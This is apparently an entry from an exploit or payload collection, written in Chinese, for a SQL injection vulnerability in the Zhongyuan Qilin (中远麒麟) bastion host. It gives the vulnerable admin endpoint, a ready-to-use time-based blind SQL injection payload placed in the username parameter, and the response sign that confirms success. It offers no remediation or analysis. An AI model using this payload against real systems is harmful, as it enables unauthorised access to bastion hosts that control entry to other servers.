# 中远麒麟堡垒机SQL注入漏洞

中远麒麟堡垒机 ｜ SQL注入 ｜ —
- **请求**：`POST /admin.php?controller=admin_commonuser HTTP/1.1`

**Payload**
```
username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
```
- **响应特征**：-1